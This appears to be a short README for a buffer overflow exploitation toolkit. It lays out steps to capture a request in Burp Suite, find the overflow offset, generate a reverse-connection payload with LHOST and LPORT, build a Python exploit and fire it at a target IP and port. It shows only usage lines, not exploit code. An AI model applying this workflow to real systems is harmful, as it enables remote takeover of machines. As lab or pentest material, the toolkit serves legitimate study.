===================
Buffer Overflow Set
===================
* I only tested this on windows os

1. make request file
	turn on burpsuite and capture the request
2. find offset 
	find the buffer's size
	./findOffset <request file> <target ip> <target port> <user form tag name> <pattern length to use>
3. create payload
	create suitable payload
	./create_payload <OS> <system bits> <LHOST> <LPORT> <outout file>
4. create exploit
	create exploit python script
	./create_exploit <payload file> <output file>
5. exploit
	<exploit script> <request file> <host ip> <target port> <target form tag name> <offset>
